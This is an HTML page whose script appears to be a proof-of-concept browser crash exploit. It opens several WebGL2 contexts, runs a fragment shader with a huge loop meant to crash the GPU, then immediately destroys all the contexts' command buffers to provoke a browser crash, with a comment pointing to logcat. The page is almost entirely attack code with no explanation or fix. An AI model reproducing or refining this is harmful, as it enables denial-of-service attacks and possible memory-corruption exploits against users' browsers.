<html>
<body>
<pre id="log"></pre>
<script>
const log = msg => {
  document.getElementById('log').textContent += msg + '\n';
  console.log(msg);
};

async function main() {
  // 1. Create several WebGL contexts to populate command buffers
  const canvases = [];
  const gls = [];
  for (let i = 0; i < 5; i++) {
    const c = document.createElement('canvas');
    c.width = c.height = 1;
    document.body.appendChild(c);
    const gl = c.getContext('webgl2', { preserveDrawingBuffer: true });
    if (gl) {
      gls.push(gl);
      canvases.push(c);
    }
  }
  log(`Created ${gls.length} WebGL contexts.`);

  // 2. Use your shader trigger to crash the GPU
  //    (Your exact shader page code – we’ll embed a simplified version)
  function triggerGpuCrash() {
    const offscreen = new OffscreenCanvas(256, 256);
    const gl = offscreen.getContext('webgl2', { powerPreference: 'high-performance' });
    if (!gl) return;
    // Compile a heavy shader known to crash the GPU (your shader)
    const vShader = gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vShader, `
      attribute vec4 position;
      void main() { gl_Position = position; }
    `);
    gl.compileShader(vShader);
    const fShader = gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fShader, `
      precision highp float;
      void main() {
        // Large loop that exhausts GPU resources?
        for (int i = 0; i < 100000; i++) {
          gl_FragColor = vec4(float(i));
        }
      }
    `);
    gl.compileShader(fShader);
    const prog = gl.createProgram();
    gl.attachShader(prog, vShader);
    gl.attachShader(prog, fShader);
    gl.linkProgram(prog);
    gl.useProgram(prog);
    gl.drawArrays(gl.TRIANGLES, 0, 3);
  }

  log('Triggering GPU crash...');
  triggerGpuCrash();

  // 3. Immediately destroy all contexts (send DestroyCommandBuffer)
  for (const c of canvases) {
    c.width = 0;   // this triggers teardown of the command buffer
  }
  log('Destroyed all contexts – check logcat for browser crash!');
}
main();
</script>
</body>
</html>
